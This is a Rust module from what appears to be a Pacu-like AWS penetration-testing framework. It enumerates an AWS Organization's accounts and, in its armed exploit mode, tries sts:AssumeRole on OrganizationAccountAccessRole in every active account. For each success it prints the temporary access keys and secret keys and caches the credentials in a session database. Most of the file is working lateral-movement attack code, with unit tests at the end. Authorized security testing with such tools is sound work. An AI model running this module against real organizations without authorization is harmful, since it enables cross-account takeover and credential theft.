//! organizations__assume_role — enumerate AWS Organization accounts and attempt to assume a role in each.
//!
//! Category: LATERAL_MOVE. Services: ["Organizations", "STS"].
//!
//! Args:
//!   --role-name <name>     role name to assume in each account (default: "OrganizationAccountAccessRole")
//!   --session-name <name>  STS session name (default: "lancer-pacu")
//!   --accounts             just list accounts without assuming roles
//!
//! Dry-run / --accounts:
//!   1. organizations:ListAccounts → show all accounts (ID, name, email, status)
//!   2. Print what AssumeRole attempts would be made
//!
//! --exploit + --armed:
//!   1. organizations:ListAccounts → iterate accounts
//!   2. For each active account: sts:AssumeRole with arn:aws:iam::<account_id>:role/<role-name>
//!   3. For successful assumptions: print temporary credentials, store in session cache
//!   4. Print summary: "Successfully assumed role in X/Y accounts"

use colored::Colorize;
use serde::{Deserialize, Serialize};

use crate::module::{AwsContext, Module, ModuleInfo};

// ---------------------------------------------------------------------------
// Serialisable structs
// ---------------------------------------------------------------------------

#[derive(Debug, Serialize, Deserialize, Clone)]
pub struct OrgAccount {
    pub id: String,
    pub name: String,
    pub email: String,
    pub status: String,
}

#[derive(Debug, Serialize, Deserialize, Clone)]
pub struct AssumedRoleResult {
    pub account_id: String,
    pub account_name: String,
    pub success: bool,
    pub access_key_id: Option<String>,
    pub secret_access_key: Option<String>,
    pub session_token: Option<String>,
    pub expiration: Option<String>,
}

// ---------------------------------------------------------------------------
// Module entry point
// ---------------------------------------------------------------------------

pub async fn run(ctx: &AwsContext, args: &[&str]) -> anyhow::Result<()> {
    // ── Parse args ─────────────────────────────────────────────────────────
    let role_name: &str = args
        .iter()
        .position(|&a| a == "--role-name")
        .and_then(|i| args.get(i + 1).copied())
        .unwrap_or("OrganizationAccountAccessRole");

    let session_name: &str = args
        .iter()
        .position(|&a| a == "--session-name")
        .and_then(|i| args.get(i + 1).copied())
        .unwrap_or("lancer-pacu");

    let list_only = args.contains(&"--accounts");
    let exploit = args.contains(&"--exploit");

    if exploit && !ctx.armed {
        eprintln!(
            "{}",
            "Error: --exploit requires --armed. Pass --armed when starting pacu.".red().bold()
        );
        return Ok(());
    }

    println!("{}", "organizations__assume_role".cyan().bold());
    println!(
        "  {}",
        "Enumerates AWS Organization accounts and attempts cross-account role assumption.\n"
            .yellow()
    );

    // ── List accounts ──────────────────────────────────────────────────────
    let orgs = aws_sdk_organizations::Client::new(&ctx.sdk_config);

    let mut accounts: Vec<OrgAccount> = Vec::new();
    let mut paginator = orgs.list_accounts().into_paginator().send();

    println!("  {} Calling organizations:ListAccounts...", "[INFO]".cyan());
    loop {
        match paginator.next().await {
            Some(Ok(page)) => {
                for acct in page.accounts() {
                    accounts.push(OrgAccount {
                        id: acct.id().unwrap_or("<unknown>").to_owned(),
                        name: acct.name().unwrap_or("<unknown>").to_owned(),
                        email: acct.email().unwrap_or("<unknown>").to_owned(),
                        status: format!("{:?}", acct.status().unwrap_or(&aws_sdk_organizations::types::AccountStatus::Suspended)),
                    });
                }
            }
            Some(Err(e)) => {
                eprintln!(
                    "  {} organizations:ListAccounts failed: {}",
                    "[ERR]".red().bold(),
                    e
                );
                break;
            }
            None => break,
        }
    }

    if accounts.is_empty() {
        println!(
            "  {} No accounts found (insufficient permissions or not an Organization master/delegated admin).",
            "[WARN]".yellow()
        );
        return Ok(());
    }

    // ── Print account table ────────────────────────────────────────────────
    println!(
        "\n  {} Organization accounts ({} total):",
        "[FOUND]".green().bold(),
        accounts.len()
    );
    println!(
        "  {:<14} {:<30} {:<40} {}",
        "Account ID".bold(),
        "Name".bold(),
        "Email".bold(),
        "Status".bold()
    );
    println!("  {}", "-".repeat(100));
    for acct in &accounts {
        let status_colored = if acct.status.contains("Active") {
            acct.status.green().to_string()
        } else {
            acct.status.red().to_string()
        };
        println!(
            "  {:<14} {:<30} {:<40} {}",
            acct.id.yellow(),
            acct.name,
            acct.email,
            status_colored
        );
    }

    // ── List-only mode ────────────────────────────────────────────────────
    if list_only || (!exploit && ctx.dry_run) {
        println!(
            "\n  {} Would attempt sts:AssumeRole for each ACTIVE account:",
            "[DRY-RUN]".cyan()
        );
        let active: Vec<&OrgAccount> = accounts.iter().filter(|a| a.status.contains("Active")).collect();
        for acct in &active {
            let role_arn = format!("arn:aws:iam::{}:role/{}", acct.id, role_name);
            println!(
                "  {} Would call: sts:AssumeRole(RoleArn={}, RoleSessionName={})",
                "[DRY-RUN]".cyan(),
                role_arn.yellow(),
                session_name
            );
        }
        println!(
            "\n  {} {} active account(s) targeted. Run with --exploit --armed to attempt assumption.",
            "[INFO]".cyan(),
            active.len()
        );
        return Ok(());
    }

    // ── Armed + exploit: attempt AssumeRole in each active account ─────────
    println!(
        "\n  {} Attempting sts:AssumeRole in each ACTIVE account (role: {}, session: {})...",
        "[EXEC]".red().bold(),
        role_name.yellow(),
        session_name
    );

    let sts = aws_sdk_sts::Client::new(&ctx.sdk_config);
    let mut results: Vec<AssumedRoleResult> = Vec::new();
    let mut success_count = 0usize;

    let active_accounts: Vec<&OrgAccount> = accounts.iter().filter(|a| a.status.contains("Active")).collect();
    let total = active_accounts.len();

    for acct in &active_accounts {
        let role_arn = format!("arn:aws:iam::{}:role/{}", acct.id, role_name);
        println!(
            "  {} sts:AssumeRole({}) for account {} ({})...",
            "[EXEC]".red().bold(),
            role_arn.yellow(),
            acct.id.cyan(),
            acct.name
        );

        match sts
            .assume_role()
            .role_arn(&role_arn)
            .role_session_name(session_name)
            .send()
            .await
        {
            Ok(resp) => {
                let creds = resp.credentials();
                let ak = creds.and_then(|c| Some(c.access_key_id().to_owned()));
                let sk = creds.and_then(|c| Some(c.secret_access_key().to_owned()));
                let tok = creds.and_then(|c| Some(c.session_token().to_owned()));
                let exp = creds.and_then(|c| {
                    c.expiration()
                        .fmt(aws_sdk_sts::primitives::DateTimeFormat::DateTime)
                        .ok()
                });

                println!(
                    "  {} Assumed role in {} ({})!",
                    "[OK]".green().bold(),
                    acct.id.green(),
                    acct.name
                );
                if let Some(ref k) = ak {
                    println!("    AccessKeyId:     {}", k.green());
                }
                if let Some(ref s) = sk {
                    println!("    SecretAccessKey: {}", s.green());
                }
                if let Some(ref t) = tok {
                    println!("    SessionToken:    {}...", &t[..t.len().min(40)]);
                }
                if let Some(ref e) = exp {
                    println!("    Expiration:      {}", e);
                }

                results.push(AssumedRoleResult {
                    account_id: acct.id.clone(),
                    account_name: acct.name.clone(),
                    success: true,
                    access_key_id: ak,
                    secret_access_key: sk,
                    session_token: tok,
                    expiration: exp,
                });
                success_count += 1;
            }
            Err(e) => {
                println!(
                    "  {} AssumeRole failed for {} ({}): {}",
                    "[FAIL]".red(),
                    acct.id.red(),
                    acct.name,
                    e
                );
                results.push(AssumedRoleResult {
                    account_id: acct.id.clone(),
                    account_name: acct.name.clone(),
                    success: false,
                    access_key_id: None,
                    secret_access_key: None,
                    session_token: None,
                    expiration: None,
                });
            }
        }
    }

    // ── Cache results to session DB ────────────────────────────────────────
    if let Some(pool) = &ctx.db_pool {
        let extra = serde_json::to_string(&results).unwrap_or_default();
        let _ = sqlx::query(
            "INSERT INTO sessions (module, extra) VALUES (?, ?)",
        )
        .bind("organizations__assume_role")
        .bind(extra)
        .execute(pool)
        .await;
    }

    // ── Summary ────────────────────────────────────────────────────────────
    println!(
        "\n  {} Successfully assumed role in {}/{} accounts.",
        if success_count > 0 { "[DONE]".green().bold() } else { "[DONE]".yellow().bold() },
        success_count,
        total
    );

    Ok(())
}

// ---------------------------------------------------------------------------
// Module registration
// ---------------------------------------------------------------------------

inventory::submit! {
    Module {
        info: ModuleInfo {
            name: "organizations__assume_role",
            author: "lancer-pacu",
            category: "LATERAL_MOVE",
            one_liner: "Enumerate org accounts and attempt cross-account role assumption via STS.",
            services: &["Organizations", "STS"],
        },
        run: |ctx, args| Box::pin(run(ctx, args)),
    }
}

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------
#[cfg(test)]
mod tests {
    use crate::module::Module;

    #[test]
    fn module_registered_in_inventory() {
        let found = inventory::iter::<Module>
            .into_iter()
            .any(|m| m.info.name == "organizations__assume_role");
        assert!(found, "organizations__assume_role not found in inventory");
    }

    #[test]
    fn module_category_is_lateral_move() {
        let m = inventory::iter::<Module>
            .into_iter()
            .find(|m| m.info.name == "organizations__assume_role")
            .expect("organizations__assume_role not found");
        assert_eq!(m.info.category, "LATERAL_MOVE");
    }

    #[test]
    fn module_services_include_organizations_and_sts() {
        let m = inventory::iter::<Module>
            .into_iter()
            .find(|m| m.info.name == "organizations__assume_role")
            .expect("organizations__assume_role not found");
        assert!(m.info.services.contains(&"Organizations"));
        assert!(m.info.services.contains(&"STS"));
    }

    #[tokio::test]
    async fn accounts_flag_parses_correctly() {
        let sdk_config = aws_config::defaults(aws_config::BehaviorVersion::latest())
            .no_credentials()
            .load()
            .await;
        let ctx = crate::module::AwsContext {
            dry_run: true,
            armed: false,
            sdk_config,
            db_pool: None,
        };
        // --accounts flag: runs in list-only mode; may fail AWS call with no creds
        // but should not error on arg parsing
        let result = super::run(&ctx, &["--accounts"]).await;
        // Any result is acceptable — we just verify no panic and arg handling works
        let _ = result;
    }

    #[tokio::test]
    async fn custom_role_name_parsed() {
        let sdk_config = aws_config::defaults(aws_config::BehaviorVersion::latest())
            .no_credentials()
            .load()
            .await;
        let ctx = crate::module::AwsContext {
            dry_run: true,
            armed: false,
            sdk_config,
            db_pool: None,
        };
        // --role-name with custom value should not cause arg-parse errors
        let result = super::run(&ctx, &["--accounts", "--role-name", "MyCustomRole"]).await;
        let _ = result;
    }

    #[tokio::test]
    async fn exploit_without_armed_returns_ok() {
        let sdk_config = aws_config::defaults(aws_config::BehaviorVersion::latest())
            .no_credentials()
            .load()
            .await;
        let ctx = crate::module::AwsContext {
            dry_run: true,
            armed: false,
            sdk_config,
            db_pool: None,
        };
        let result = super::run(&ctx, &["--exploit"]).await;
        // Should return Ok() and print error message, not panic
        assert!(result.is_ok(), "exploit without armed should return Ok: {:?}", result.err());
    }

    #[test]
    fn org_account_struct_serializes() {
        let acct = super::OrgAccount {
            id: "123456789012".to_string(),
            name: "TestAccount".to_string(),
            email: "test@example.com".to_string(),
            status: "Active".to_string(),
        };
        let json = serde_json::to_string(&acct).expect("serialization failed");
        assert!(json.contains("123456789012"));
        assert!(json.contains("TestAccount"));
    }
}
